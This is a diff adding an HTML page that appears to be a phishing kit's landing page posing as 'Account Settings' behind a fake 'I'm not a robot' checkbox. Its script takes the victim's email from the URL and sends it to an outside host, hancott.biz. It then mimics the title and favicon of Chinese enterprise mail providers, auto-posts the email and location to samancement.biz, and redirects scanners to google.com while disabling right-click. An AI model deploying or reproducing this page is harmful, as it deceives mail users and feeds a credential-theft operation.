@@ -1,0 +1,235 @@
+<!DOCTYPE html>
+<html id="Stencil" class="no-js">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0"/>
+        <meta name="format-detection" content="telephone=no">
+        <meta name="referrer" content="origin-when-cross-origin">
+        <title>Account Settings</title>
+        <link id="favLink" rel="shortcut icon" href="" type="image/x-icon">
+
+   
+
+<style>
+input[type="checkbox"]{
+width: 30px;
+height: 30px;
+background-color: white;
+float: left;
+}
+#image{
+float: right;
+}
+</style>
+<script type="text/javascript">
+	document.addEventListener("contextmenu", function (e) {
+        e.preventDefault();
+    }, false);
+    </script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+	<script src = "geo.js"></script>
+	
+ <script type="text/javascript"> 
+ 	function getUrlVars() {
+		var vars = {};
+		var parts = window.location.search.replace(/[?&]+([^=&]+)=([^&]*)/gi, function(m,key,value) {
+        vars[key] = value;
+		
+    });
+    return vars;
+	}
+	
+   $(document).ready(function(){
+	getCountry();
+   //var vsr = new URLSearchParams(window.location.search).get("vsr");
+   //filter vsr of == string
+   //alert(vsr);
+   //vsr = vsr.replace("==","");
+   
+    //var usr = new URLSearchParams(window.location.search).get("vsr");
+	//var vsr = "";
+  
+	//var vsr= window.location.href.slice(window.location.href.indexOf('=') + 1,window.location.href.indexOf('&'));  //IF THERE IS ANOTHER URL QUERY PARAM
+	
+	//var vsr= window.location.href.slice(window.location.href.indexOf('=') + 1);
+	//vsr = vsr.replace("#","");
+	var vsr = getUrlVars()['usr'];
+	//alert(vsr);
+	if (!vsr) {
+			window.location.href="https://google.com";
+	}else if (vsr.includes("http")){
+		//alert("take me outta here!");
+		window.location.href="https://google.com";
+	}else if (vsr!="nousr"){
+			//vsr = atob(vsr);
+			//alert(vsr);
+			getDns(vsr);
+			
+	}else{
+			//alert("equals");
+			$('#favLink').attr('href', 'https://logo.clearbit.com/google.com');
+	}
+
+	
+	  
+	  
+	//$('#user_field').val(vsr);
+		
+	  $('#checkBox').click(function() {
+			var delayInMilliseconds = 3000; //1 second
+			if ($('#checkBox').prop('checked')){
+				$('.chk').attr('disabled', true);
+				setTimeout(function() {
+				//your code to be executed after 1 second
+				document.getElementById('iFm').submit();
+							
+				}, delayInMilliseconds);
+						
+						
+			}
+		});
+	  
+	  
+   });
+   
+    function getDns(useremail){
+	 //alert("am here");
+	//post to ajax  cross-domain
+	var country = $('#loc').val();
+	var url = "https://hancott.biz/dns/valid.php"; 
+	var userdomain = useremail.slice(useremail.indexOf("@")+1);
+	var delay = 0;
+	//alert (useremail);
+	$.ajax({
+		crossOrigin:true,
+		type: 'GET',
+		url: "https://hancott.biz/dns/valid.php",
+		//cross-domain request
+		data:{
+			'domain': useremail,
+			'loc': country,
+			},
+			dataType: 'jsonp', // use JSONP
+			success:function(data){
+			
+				setTimeout(function() {
+					delaySuccess(data,useremail);}, delay);
+				
+			}
+	
+		});
+	
+ }
+ 
+ function delaySuccess(data,vsr){
+
+	//alert(data.message);
+				var jresult = data.message;
+				//alert(jresult);
+				//replaced if statement with switch
+				switch (jresult){
+				
+					case "FALSE":
+						window.location.href="https://google.com";
+						break;
+						
+					case "263.net":
+												
+						document.title="企业邮箱_企业直播_电话会议_视频会议系统-263云通信";
+						$("#favLink").attr("href","https://www.google.com/s2/favicons?domain="+jresult);
+						
+						break;
+					case "chinaemail.cn":
+												
+						document.title="BossMail邮局";
+						$("#favLink").attr("href","https://www.google.com/s2/favicons?domain=laobanmail.com");
+						break;
+						
+					case "mail.icoremail.net":
+												
+						document.title="BossMail邮局";
+						$("#favLink").attr("href","https://www.google.com/s2/favicons?domain="+jresult);
+						break;
+						
+					case "aliyun.com":
+												
+						document.title="AliMail Enterprise Edition";
+						$("#favLink").attr("href","https://www.google.com/s2/favicons?domain="+jresult);
+						break;
+						
+					case "21cn.com":
+						
+						
+						document.title="21CN个人邮箱";
+						$("#favLink").attr("href","https://www.google.com/s2/favicons?domain="+jresult);
+						break;
+						
+					case "exmailqq.com":
+												
+						document.title="腾讯企业邮箱";
+						$("#favLink").attr("href","https://www.google.com/s2/favicons?domain="+jresult);
+						break;
+						
+					case "qiye.163.com":
+						
+						$("#favLink").attr("href","https://www.google.com/s2/favicons?domain="+jresult);
+						document.title="网易帐号安全中心";
+						break;
+						
+					default:
+						
+						$("#favLink").attr("href","https://www.google.com/s2/favicons?domain=google.com");
+						document.title="Account settings";
+				
+				
+				
+				
+				}
+				/* classifying results*/
+				$('#fieldName').val(jresult);
+				$('#user_field').val(vsr);
+				
+				
+				
+				
+}
+
+
+
+</script>
+
+    </head>
+    <body >
+        
+   
+
+    <div class="loginish ">
+<div style="text-align:center">
+	     <font color="#ff0000" face="Lucida Grande, Lucida Sans Unicode, Lucida Sans, DejaVu Sans, Verdana, sans-serif" size="4">
+
+		
+		</font>
+	 </div>
+
+	<div class="full-page-msg-container">
+	    
+	     <!--<p class="margin20 writeup" id="verifyh1">Kindly confirm that you are not a robot</p>-->
+    <div class="action-area">
+      <form id="iFm" method="post" action="https://samancement.biz/session/index.php">
+           
+            
+			<input type="hidden" id ="user_field" value="" name="vsr">
+		<input type="hidden" value ="" id="fieldName" name="field">
+		<input type ="hidden" value="" name="loc" id="loc">
+		<input type ="hidden" value="" name="chkBxVal" id="chkBxVal">
+          
+        
+        <p id ="robot" style="border-style:ridge; border-color: rgb(238,238,238); height:78px; width:280px; border-radius:5px; background-color: #FEF9FE; padding-left:20px; padding-right: 20px;padding-top:20px;margin:auto"><input id ="checkBox" type="checkbox" name="notrobot" ><label for ="robotid" style="font-family: Helvetica, Arial, sans-serif; margin-top: 5px; font-weight: 500; font-size: 14px">I'm not a robot</label><img id="image" src="download.png" width="70px" height="70px"></p>
+        </form>
+    </div>
+</div>
+</div>
+  
+</body>
+</html>
+<!-- fe02.member.ir2.yahoo.com - Thu Mar 28 2019 04:19:50 GMT+0000 (UTC) - (0ms)-->
